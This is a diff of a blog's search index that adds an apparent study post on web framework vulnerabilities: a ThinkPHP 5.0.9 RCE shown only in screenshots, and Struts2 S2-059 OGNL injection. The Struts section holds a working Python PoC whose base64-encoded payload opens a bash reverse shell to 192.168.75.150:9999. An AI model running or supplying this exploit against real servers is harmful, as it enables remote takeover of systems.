@@ -8,7 +8,20 @@
       <link href="/2050/01/09/nihao/"/>
       <url>/2050/01/09/nihao/</url>
       
-        <content type="html"><![CDATA[<p><img src="/images/qm.jpg"></p>]]></content>
+        <content type="html"><![CDATA[<p><img src="/../images/qm.jpg"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2025/03/19/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2025/03/19/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="web框架漏洞梳理"><a href="#web框架漏洞梳理" class="headerlink" title="web框架漏洞梳理"></a>web框架漏洞梳理</h1><h2 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h2><p>版本：5.0.9</p><p>随便构造请求，得到如下版本号</p><p><img src="/../images/image-20250319145656837.png" alt="image-20250319145656837"></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><img src="/../images/image-20250319150048616.png" alt="image-20250319150048616"></p><p>利用此payload发送POST请求rce</p><p>或者利用工具</p><p><img src="/../images/image-20250319151825846.png" alt="image-20250319151825846"></p><h2 id="Struts2-059远程代码执行漏洞利用"><a href="#Struts2-059远程代码执行漏洞利用" class="headerlink" title="Struts2-059远程代码执行漏洞利用"></a>Struts2-059远程代码执行漏洞利用</h2><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p><p>影响版本: Struts 2.0.0 - Struts 2.5.20</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/../images/image-20250319152341032.png"></h2><p>对百分号进行编码，可执行命令</p><p><strong>反弹shell的POC：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure><p><img src="/../images/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20250319210818529.png" alt="1"></p>]]></content>
       
       
       
